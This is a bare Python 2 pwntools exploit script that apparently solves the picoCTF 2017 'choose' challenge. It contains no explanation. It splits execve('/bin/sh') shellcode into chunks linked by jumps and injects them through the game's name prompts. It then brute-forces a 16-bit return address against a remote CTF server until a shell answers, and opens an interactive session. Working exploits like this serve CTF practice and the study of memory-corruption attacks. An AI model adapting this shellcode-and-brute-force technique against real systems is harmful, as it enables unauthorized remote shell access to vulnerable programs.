from pwn import *

# actual = 0xdb9a
for j in range(0xd002,0xdfff,4):
    print hex(j)
    if j & 0xff == 0x0a:
        continue
    stuff = {0: unhex('31c050682f2f7368eb0e'), 1: unhex('682f62696e89e389c2eb0d'), 2: unhex('b00bcd80'), 3: 'a', 4: 'a', 5: 'a', 6: 'a', 7: 'a', 8: 'a', 9: 'a', 10: 'aa{}\xff\xff'.format(p16(j))}
    r = remote('shell2017.picoctf.com', 25532)
    #r = process('./choose')
    for i in range(11):
        r.recvuntil('{}: '.format(i))
        r.send('u\n')

    for i in range(11):
        r.recvuntil('unicorn:\n')
        r.send(stuff[i] + '\n')

    for _ in range(11 + 6):
        r.recvuntil('Flee\n')
        r.send('F\n')
    r.recvline()
    r.recvline()
    r.recvline()
    try:
        r.send('ls\n')
        r.recvline()
    except Exception, e:
        print str(e)
        r.close()
        continue
    r.interactive()
